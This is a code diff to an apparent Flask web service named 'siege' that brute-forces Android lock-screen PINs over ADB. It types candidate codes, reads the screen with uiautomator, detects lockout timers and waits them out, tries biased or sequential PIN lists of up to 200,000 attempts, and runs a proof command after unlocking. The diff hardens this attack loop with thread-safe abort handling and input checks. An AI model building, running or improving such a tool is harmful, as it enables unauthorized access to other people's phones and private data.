@@ -84,7 +84,7 @@ _LOCKOUT_PATTERNS = [
     re.compile(r"(?:r[ée]essayez|attendre?)[^0-9]{0,24}(\d+)\s*(seconde|minute)", re.I),
 ]
 _WRONG_PATTERNS = [
-    re.compile(r"(wrong|incorrect|falsch|incorrect|erron)", re.I),
+    re.compile(r"(wrong|incorrect|falsch|erron)", re.I),
 ]
 
 
@@ -117,12 +117,12 @@ def _keyguard_showing(serial):
         if not out:
             continue
         for key_true in ("keyguardshowing=true", "iskeyguardshowing=true",
-                         "mshowing=true", "keyguard showing: true"):
+                         "mshowing=true", "keyguardshowing:true"):
             if key_true in out.replace(" ", ""):
                 return True
         for key_false in ("keyguardshowing=false", "iskeyguardshowing=false",
                           "mshowing=false"):
-            if key_false in out.replace(" ", "").replace(":", ":"):
+            if key_false in out.replace(" ", ""):
                 return False
     return True   # assume locked when blind — safe direction
 
@@ -192,8 +192,12 @@ def _try_code(code, serial):
     if not (4 <= len(code) <= 8 and code.isdigit()):
         return "REJECTED", 0
     engine.shell(f"input text {code}", serial=serial, timeout=8)
+    if STATE.abort:
+        return "ABORTED", 0
     engine.shell("input keyevent 66", serial=serial, timeout=8)     # ENTER
     time.sleep(0.85)                                                # let UI settle
+    if STATE.abort:
+        return "ABORTED", 0
     dump = engine.shell("uiautomator dump /sdcard/siege_ui.xml && "
                         "cat /sdcard/siege_ui.xml >/dev/null && "
                         "uiautomator dump --compressed /dev/tty 2>/dev/null; "
@@ -207,6 +211,8 @@ def _try_code(code, serial):
     # Secondary: toast/screen text for wrong-vs-lockout ladder
     xml_res = engine.shell("cat /sdcard/siege_ui.xml 2>/dev/null || true",
                            serial=serial, timeout=12)
+    if STATE.abort:
+        return "ABORTED", 0
     verdict, wait = _parse_lockscreen_toast(xml_res.get("stdout", ""))
     engine.shell("rm -f /sdcard/siege_ui.xml", serial=serial, timeout=8)
     if verdict == "locked":
@@ -219,25 +225,33 @@ def _run_siege(codes, serial, proof_cmd):
     _wake_and_ready(serial)
     consecutive_errors = 0
     for code in codes:
-        if STATE.abort:
+        with STATE.lock:
+            aborting = STATE.abort
+            unlocked = STATE.unlocked
+            waiting_until = STATE.waiting_until
+        if aborting:
             STATE.note("aborted by operator")
             break
-        if STATE.unlocked:
+        if unlocked:
             break
 
         now = time.time()
-        if now < STATE.waiting_until:
-            remain = STATE.waiting_until - now
+        if now < waiting_until:
+            remain = waiting_until - now
             STATE.note(f"respecting lockout ladder — {int(remain)}s")
-            while time.time() < STATE.waiting_until and not STATE.abort:
-                time.sleep(min(2, STATE.waiting_until - time.time()))
-            if STATE.abort:
+            while True:
+                with STATE.lock:
+                    waiting_until = STATE.waiting_until
+                    aborting = STATE.abort
+                if time.time() >= waiting_until or aborting:
+                    break
+                time.sleep(min(2, waiting_until - time.time()))
+            if aborting:
                 break
             _wake_and_ready(serial)
 
         with STATE.lock:
             STATE.current_code = code
-            STATE.attempts += 1
         try:
             verdict, wait = _try_code(code, serial)
             consecutive_errors = 0
@@ -249,6 +263,13 @@ def _run_siege(codes, serial, proof_cmd):
                 break
             time.sleep(3)
             continue
+
+        if verdict == "ABORTED":
+            break
+        if verdict == "REJECTED":
+            continue
+        with STATE.lock:
+            STATE.attempts += 1
 
         if verdict == "UNLOCKED":
             with STATE.lock:
@@ -264,8 +285,10 @@ def _run_siege(codes, serial, proof_cmd):
                 STATE.waiting_until = time.time() + wait + 2   # +2 grace
             STATE.note(f"ladder step: locked {wait}s after {code}")
         else:
-            if STATE.attempts % 25 == 0:
-                STATE.note(f"at={STATE.attempts} last={code}")
+            with STATE.lock:
+                attempts_now = STATE.attempts
+            if attempts_now % 25 == 0:
+                STATE.note(f"at={attempts_now} last={code}")
             time.sleep(0.15)
 
     with STATE.lock:
@@ -276,14 +299,23 @@ def _run_siege(codes, serial, proof_cmd):
 
 @siege_bp.route("/start", methods=["POST"])
 def start():
-    if STATE.running:
+    with STATE.lock:
+        already_running = STATE.running
+    if already_running:
         return jsonify({"success": False,
                         "error": "un siège tourne déjà"}), 409
     data = request.get_json() or {}
     serial = (data.get("serial") or "").strip() or None
     preset = data.get("preset", "biased")          # biased | sequential6 | custom
     custom = data.get("codes") or []
-    max_attempts = min(int(data.get("max_attempts", 3000)), 200000)
+    try:
+        max_attempts = min(int(data.get("max_attempts", 3000)), 200000)
+    except (TypeError, ValueError):
+        return jsonify({"success": False,
+                        "error": "max_attempts invalide"}), 400
+    if max_attempts < 1:
+        return jsonify({"success": False,
+                        "error": "max_attempts invalide"}), 400
     proof_cmd = data.get("proof_cmd") or "getprop ro.product.model; id"
 
     if preset == "custom" and not custom:
@@ -296,11 +328,15 @@ def start():
     if preset == "sequential6":
         stream = _sequential_pins(cap=max_attempts)
     else:
-        stream = _biased_pins()
+        stream = list(_biased_pins())
         if custom:
             stream = list(dict.fromkeys(custom + stream))
+        stream = stream[:max_attempts]   # cap every preset to max_attempts
 
     with STATE.lock:
+        if STATE.running:
+            return jsonify({"success": False,
+                            "error": "un siège tourne déjà"}), 409
         STATE.reset()
         STATE.running = True
         STATE.serial = serial
@@ -319,5 +355,6 @@ def status():
 
 @siege_bp.route("/stop", methods=["POST"])
 def stop():
-    STATE.abort = True
+    with STATE.lock:
+        STATE.abort = True
     return jsonify({"success": True, "stopping": True})
